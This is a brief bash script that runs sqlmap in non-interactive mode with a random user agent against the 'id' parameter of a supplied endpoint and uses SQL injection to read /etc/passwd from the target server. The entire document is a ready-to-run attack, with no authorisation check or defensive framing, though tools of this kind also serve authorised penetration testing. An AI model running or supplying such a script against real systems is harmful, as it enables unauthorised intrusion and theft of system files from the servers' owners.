#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

BASE_URL=$(echo "$ENDPOINT" | sed 's/\?.*$//')

sqlmap -u "${BASE_URL}?id=1" \
  --batch --random-agent \
  --file-read="/etc/passwd" \
  2>&1 | tail -20
